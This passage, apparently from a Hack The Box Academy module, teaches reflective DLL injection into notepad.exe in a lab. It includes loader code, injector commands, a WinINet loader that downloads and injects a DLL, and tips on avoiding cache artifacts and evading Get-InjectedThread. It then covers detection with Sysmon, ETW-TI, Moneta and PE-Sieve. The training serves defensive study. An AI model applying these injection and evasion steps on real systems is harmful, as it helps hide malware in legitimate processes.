In this step, the entry point of the newly loaded DLL or EXE is called.

```c
// uiValueA = the VA of our newly loaded DLL/EXE's entry point
uiValueA = ( uiBaseAddress + ((PIMAGE_NT_HEADERS)uiHeaderValue)->OptionalHeader.AddressOfEntryPoint );

// We must flush the instruction cache to avoid stale code being used which was updated by our relocation processing.
pNtFlushInstructionCache( (HANDLE)-1, NULL, 0 );

// call our respective entry point, fudging our hInstance value
#ifdef REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR
// if we are injecting a DLL via LoadRemoteLibraryR we call DllMain and pass in our parameter (via the DllMain lpReserved parameter)
((DLLMAIN)uiValueA)( (HINSTANCE)uiBaseAddress, DLL_PROCESS_ATTACH, lpParameter );
#else
// if we are injecting an DLL via a stub we call DllMain with no parameter
((DLLMAIN)uiValueA)( (HINSTANCE)uiBaseAddress, DLL_PROCESS_ATTACH, NULL );
#endif

//Return our new entry point address so whatever called us can call DllMain() if needed.
return uiValueA;

```

* * *

## Reflective DLL Injection Demo

For the demonstration, we have two files. One is the injector file, and other is the reflective DLL loader.

Let's navigate to the bottom of this section and click on " `Click here to spawn the target system!`". Then, let's RDP into the Target IP using the provided credentials. The mentioned tools (inclduing WinDbg) are installed on the target system and the shortcut files are created on the desktop. The vast majority of the actions/commands covered from this point up to end of this section can be replicated inside the target, offering a more comprehensive grasp of the topics presented.

Within the target (VM), we can locate the compiled sample program, and tools at the following paths:

- **Loader**: `C:\injection\reflective\inject.x64.exe`
- **DLL**: `C:\injection\reflective\reflective_dll.x64.dll`

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-64.png)

We started two instances of x64dbg to debug this technique.

1. One instance is for the target process, i.e., `notepad.exe`. We started `notepad.exe` and attached it to the `x64dbg` debugger.
2. In the other instance of `x64dbg`, we executed the injector process `inject.x64.exe` with the target PID of `notepad.exe`.

```cmd-session
C:\injection\reflective\inject.x64.exe 1852 reflective_dll.x64.dll

```

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-63.png)

We will add breakpoints on `VirtualAlloc`, `WriteProcessMemory`, and `CreateRemoteThread`. Now, when the first memory allocation takes place, a new region is created in the remote process where the reflective loader DLL will be copied. Then, `WriteProcessMemory` will be called to write the whole DLL into this location.

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-65.png)

After the call to `WriteProcessMemory` is successful, the reflective loader DLL is written to this allocated memory block.

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-66.png)

Then, the `CreateRemoteThread()` function is called, which in turn calls the `ReflectiveLoader()` function that takes care of calling the `DllMain`.

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-67.png)

After the thread is created, these steps will be executed in the target process by the `ReflectiveLoader()` function:

1. Resolve required functions.
2. Memory allocation for our DLL.
3. Copy the DLL with sections, headers, IAT, relocations.
4. Calling the Entrpoint of the copied DLL.

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-75_.png)

The call to `VirtualAlloc` occurs, which creates a memory region with `RWX` permissions in the target process, i.e., `notepad.exe`.

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-68.png)

Then, the DLL (which contains the DllMain to execute `MessageBox`) is written to the new region.

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-69.png)

Once the entrypoint is called, a message box is displayed, indicating that the injection is successful.

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-70.png)


# Reflective DLL Injection - Detections

In this section we are going to showcase different detection methods of Reflective DLL injection.

We can execute the program to demonstrate the Reflective DLL injection technique.

```cmd-session
C:\> C:\injection\reflective\inject.x64.exe 1852 C:\injection\reflective\reflective_dll.x64.dll

```

Two suspicious memory regions are created: one for the reflective loader and the other for the DLL, as we can see in the `Memory` tab of Process Hacker.

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-71.png)

In the stack call trace, we can see evidence that it originated from a suspicious address. This address is from within the memory region allocated for the DLL. In this scenario, it was the entry point of the DLL, i.e., the `DllMain` function, which contains the instructions to execute `MessageBox`.

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-72.png)

When the target process is opened, i.e., a handle to the target process is acquired, process access logs are generated, which contain the details of the source process, target process, access mask, and stack call trace.

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-73.png)

Additionally, an event was generated for the remote thread creation.

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-74.png)

* * *

## ETW-TI

Using `Sealighter`, we can view the ETW-TI events. Memory allocation activity is captured in the logs, where we can see the allocation base address, i.e., the address of the memory region where the reflective loader will be written.

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-76.png)

Thread creation activity can be observed in the logs, where we can see the details such as the source process, remote process, and thread ID:

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-77.png)

* * *

## Detections using Get-InjectedThread

There's a PowerShell script, [Get-InjectedThread](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2), which is designed to detect code injection in running processes by examining the memory properties of each thread.

The script iterates over each running process on the system using `Get-Process`. For each process, it iterates over all its threads. Each thread is opened using `OpenThread` to get a handle with `THREAD_ALL_ACCESS`. Then, the base address of the thread is retrieved using `NtQueryInformationThread`. The script opens the process containing the thread using `OpenProcess`. It queries the memory information of the thread's base address using `VirtualQueryEx`. This is done to check if the memory state is committed ( `MEM_COMMIT`) and not an image ( `MEM_IMAGE`), indicating dynamically allocated memory. It reads a portion of the memory at the base address using `ReadProcessMemory` and checks the size of the memory region. It compares the expected path of the process with the actual path to check for discrepancies, which might indicate injection. However, it is not foolproof and can be bypassed by advanced techniques or attackers who are aware of such detection methods. One way to avoid this detection is to ensure that the thread's entry point is backed by a file on disk.

```powershell
function Get-InjectedThread
{

...SNIP...

    foreach($proc in (Get-Process))
    {
        if($proc.Id -ne 0 -and $proc.Id -ne 4)
        {
            Write-Verbose -Message "Checking $($proc.Name) [$($proc.Id)] for injection"
            foreach($thread in $proc.Threads)
            {
                Write-Verbose -Message "Thread Id: [$($thread.Id)]"

                $hThread = OpenThread -ThreadId $thread.Id -DesiredAccess THREAD_ALL_ACCESS
                if($hThread -ne 0)
                {
                    $BaseAddress = NtQueryInformationThread -ThreadHandle $hThread
                    $hProcess = OpenProcess -ProcessId $proc.Id -DesiredAccess PROCESS_ALL_ACCESS -InheritHandle $false

                    if($hProcess -ne 0)
                    {
                        $memory_basic_info = VirtualQueryEx -ProcessHandle $hProcess -BaseAddress $BaseAddress
                        $AllocatedMemoryProtection = $memory_basic_info.AllocationProtect -as $MemProtection
                        $MemoryProtection = $memory_basic_info.Protect -as $MemProtection
                        $MemoryState = $memory_basic_info.State -as $MemState
                        $MemoryType = $memory_basic_info.Type -as $MemType

                        if($MemoryState -eq $MemState::MEM_COMMIT -and $MemoryType -ne $MemType::MEM_IMAGE)
                        {
                            if($memory_basic_info.RegionSize.ToUInt64() -ge 0x400)
                            {
                                $buf = ReadProcessMemory -ProcessHandle $hProcess -BaseAddress $BaseAddress -Size 0x400
                            }
                            else
                            {
                                $buf = ReadProcessMemory -ProcessHandle $hProcess -BaseAddress $BaseAddress -Size $memory_basic_info.RegionSize
                            }
                            $proc = Get-WmiObject Win32_Process -Filter "ProcessId = '$($proc.Id)'"
                            $KernelPath = QueryFullProcessImageName -ProcessHandle $hProcess
                            $PathMismatch = $proc.Path.ToLower() -ne $KernelPath.ToLower()

...SNIP...

```

To test this script in a detection scenario, first, we need to download the script from [GitHub](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2). The script is already saved in the following location on the target system:

- `C:\injection\tools\Get-InjectedThread.ps1`

Import it into the PowerShell session and run the `Get-InjectedThread` cmdlet.

```powershell
PS C:\injection\tools> Import-Module .\Get-InjectedThread.ps1
PS C:\injection\tools> Get-InjectedThread

```

We run the `Get-InjectedThread` cmdlet, which will check all running processes. We should be able to see the detection for the target process, i.e., `notepad.exe`.

![RDLL](https://academy.hackthebox.com/storage/modules/266/psgetinj.png)

In the output, the thread represents the injected thread running in memory.

* * *

## Detections using Moneta

`Moneta` also provides two IOCs, i.e., `Abnormal private executable memory`, which points to the location where our shellcode is stored, and `Thread within non-image memory region`.

`Abnormal private executable memory` refers to memory regions that are marked as executable (meaning code can be run from them) but are also private and not associated with any known executable file on disk.

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll-detect-2.png)

`Thread within non-image memory region` refers to the detection of a thread that starts executing code from a memory region that is not backed by an image file (such as a DLL or EXE).

For classic reflective DLL injections, the name of the exported function is also in memory, i.e., `ReflectiveLoader()` (such as used by Meterpreter), which can also be scanned by memory scanners to detect this injection.

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll-detect-1.png)

* * *

## Detections using PE Sieve

`PE-Sieve` can also detect and analyze the injected modules in a given process. It has detected two suspicious regions, and dumped them as "VIRTUAL" and "REALIGNED". As we can see in the screenshot, both have "RWX" permissions. Since reflective DLL injection loads the DLL directly into memory and executes it from there, it is not surprising that the DLL is manually mapped into the process memory and not backed by a file on disk.

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll-detect-3.png)

When the dump mode is virtual, the PE is dumped as it is in memory. No changes are made to the sections table or the content of the sections. If the PE was loaded into memory as an executable, it will be in the virtual format, and it cannot run. This mode is useful when you want to see the original layout that was in memory, with no modifications applied by PE-Sieve.

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll-detect-4.png)

For "Realigned", the PE alignment is changed to be the same as the virtual alignment. It is most suitable for the PE with some packed sections that are unpacked and expanded in memory. This makes the PE suitable for static analysis.

If we open the dumped modules in `CFF Explorer`, we can see that it is the reflective loader DLL.

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll-detect-5.png)

* * *

## DLL file in cache

Some malware uses WinINet functions to download the DLL from the internet, such as [InternetOpen()](https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopena), [InternetOpenUrl()](https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopenurla), [InternetReadFile()](https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-InternetReadFile), and [InternetCloseHandle()](https://learn.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetclosehandle). These functions also leave evidence on the filesystem.

Below is a sample program that reads a DLL (hosted on a remote server) directly into memory and injects it into a remote process. This stores the cached DLL file on the system. As we can see in the screenshot below, a file creation event is created, which shows that the DLL is stored in a subdirectory inside the INetCache directory: `C:\Users\<username>\AppData\Local\Microsoft\Windows\INetCache\IE`.

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-79.png)

When we use WinINet functions to download a file and read it into memory without explicitly saving it to disk, the data can still be cached by Internet Explorer (IE) or the WinINet subsystem. This behavior depends on how the cache settings are configured and how the functions are used. By default, WinINet can use the system's internet cache (commonly referred to as the IE cache) to store downloaded content. This means that even if we read the content directly into memory and do not explicitly save it to disk, the content might still be cached on the filesystem.

In this scenario, the DLL file is downloaded because caching is enabled by default, and the `dwFlags` parameter passed to the `InternetOpenUrl` function contains the `INTERNET_FLAG_RELOAD` value, which forces a download of the requested file, object, or directory listing from the origin server, not from the cache. Therefore, there is no parameter used to disable caching of the remote file.

```c
   HINTERNET hInternet = InternetOpen("HTB Reflective DLL Demo Program", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL) {
        printf("Error opening internet\n");
        return NULL;
    }

    HINTERNET hUrl = InternetOpenUrl(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (hUrl == NULL) {
        printf("Error opening URL\n");
        InternetCloseHandle(hInternet);
        return NULL;
    }

```

However, we can control the caching behavior using flags and settings in the `InternetOpenUrl` function. For instance, we can use the `INTERNET_FLAG_NO_CACHE_WRITE` flag to ensure that the downloaded data is not cached:

```c
   HINTERNET hInternet = InternetOpen("HTB Reflective DLL Demo Program", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet == NULL) {
        printf("Error opening internet\n");
        return NULL;
    }

    HINTERNET hUrl = InternetOpenUrl(hInternet, url, NULL, 0, INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (hUrl == NULL) {
        printf("Error opening URL\n");
        InternetCloseHandle(hInternet);
        return NULL;
    }

```

Using `INTERNET_FLAG_NO_CACHE_WRITE` instructs WinINet to avoid writing the response data to the cache, thus preventing any caching on the disk. In this scenario, there are no file creation events.

![RDLL](https://academy.hackthebox.com/storage/modules/266/rdll_image-78.png)

* * *

To simulate this on the target system, we can browse to the following location: `C:\injection\reflective\demo`. It contains these samples and the DLL file.

![RDLL](https://academy.hackthebox.com/storage/modules/266/py-loc.png)

The first sample, i.e., `down_reflective_reload.exe` has the `INTERNET_FLAG_RELOAD` flag set. The other executable, i.e, `down_reflective_nocache.exe` has the `INTERNET_FLAG_NO_CACHE_WRITE` flag set.

We can setup a local python http server using `python.exe -m http.server` to host the DLL file.

```powershell
PS C:\> cd C:\injection\reflective\demo
PS C:\injection\reflective\demo> C:\Tools\Python\python.exe -m http.server
Serving HTTP on :: port 8000 (http://[::]:8000/) ...

```

This will host the DLL file locally for the demonstration.

![RDLL](https://academy.hackthebox.com/storage/modules/266/py-host1.png)

Next, run the demo executable from the `C:\injection\reflective\demo` location with the HTTP URL (localhost:8000) for the DLL. The first sample `down_reflective_reload.exe` runs with the `INTERNET_FLAG_RELOAD` value which will save the DLL file in cache and a log event will be created.

```powershell
PS C:\injection\reflective\demo> .\down_reflective_reload.exe 3224 http://localhost:8000/reflective.dll

[!] CallingProcessId   : 2812
[!] TargetProcessId    : 3224
[!] DLL Download URL   : http://localhost:8000/reflective.dll
[+] HTTP Status Code: 200
[+] Reading DLL into memory
[+] DLL Size: 36352 bytes
[+] DLL successfully downloaded in memory at address 000001fd4144d040 (local)
[+] DLL (starting with 4D 5A 90 00 03 00 00 00 04 00 ) is written at this address
[+] Getting handle to the remote process i.e. 3224
[+] Allocated memory at the address 000001efce6f0000 (remote)

Press enter to write DLL headers, sections. . .

[+] Copying Headers
[+] Copying Sections...
[+] Adjusting PE And Executing....

Press enter to exit. . .

```

This will download the DLL into memory from the HTTP server and reflectively load it into `notepad.exe` without using `LoadLibrary`.

![RDLL](https://academy.hackthebox.com/storage/modules/266/py-inet2.png)

Similarly, the other sample, `down_reflective_nocache.exe`, performs the same task but with the `INTERNET_FLAG_NO_CACHE_WRITE` flag.

```powershell
PS C:\injection\reflective\demo> .\down_reflective_nocache.exe 3224 http://localhost:8000/reflective.dll

[!] CallingProcessId   : 4792
[!] TargetProcessId    : 3224
[!] DLL Download URL   : http://localhost:8000/reflective.dll
[+] HTTP Status Code: 200
[+] Reading DLL into memory
[+] DLL Size: 36352 bytes
[+] DLL successfully downloaded in memory at address 0000023bd4c52040 (local)
[+] DLL (starting with 4D 5A 90 00 03 00 00 00 04 00 ) is written at this address
[+] Getting handle to the remote process i.e. 3224
[+] Allocated memory at the address 000001efce250000 (remote)

Press enter to write DLL headers, sections. . .

[+] Copying Headers
[+] Copying Sections...
[+] Adjusting PE And Executing....

Press enter to exit. . .

```

This will download the `reflective.dll` into memory and reflectively load it into `notepad.exe` without caching it on the disk.

![RDLL](https://academy.hackthebox.com/storage/modules/266/py-inet1.png)

As an additional task, analyze the Sysmon logs for both scenarios after running this.

* * *


# Process Injection - Skills Assessment

You are working as a Purple Team Analyst for `Starlight Hospitals`. Your task is to simulate and analyze a suspected process injection attack. Your objective is to thoroughly analyze the execution of the sample, identify any malicious behaviors related to process injection, and evaluate the security event logging and the effectiveness of the organization’s current defenses in detecting such attacks.

A custom program, `C:\injection\exercises\assessment\project.exe`, has been deployed, to simulate process injection techniques.

![injection](https://academy.hackthebox.com/storage/modules/266/skillsass.png)

Your job is to:

- Analyze the behavior of `project.exe` and verify the event logs.
- Determine what kind of process injection techniques are used.
- Debug the shellcode if there's any trace of it.
- In the end, you need to find a flag to complete this assessment.


